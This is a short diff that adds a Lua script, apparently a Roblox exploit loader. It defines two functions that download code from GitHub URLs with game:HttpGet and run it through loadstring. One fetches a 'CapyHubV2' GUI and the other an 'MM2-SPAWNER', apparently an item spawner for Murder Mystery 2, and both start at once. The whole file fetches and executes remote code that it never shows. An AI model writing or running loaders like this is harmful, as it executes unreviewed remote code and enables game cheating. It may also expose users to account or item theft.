@@ -1,0 +1,9 @@
+local function gui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/active-gui/CapyHubV2/refs/heads/main/true.lua"))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://github.com/active-gui/MM2-SPAWNER/blob/main/end"))()
+end
+
+task.spawn(gui)
+task.spawn(farm)
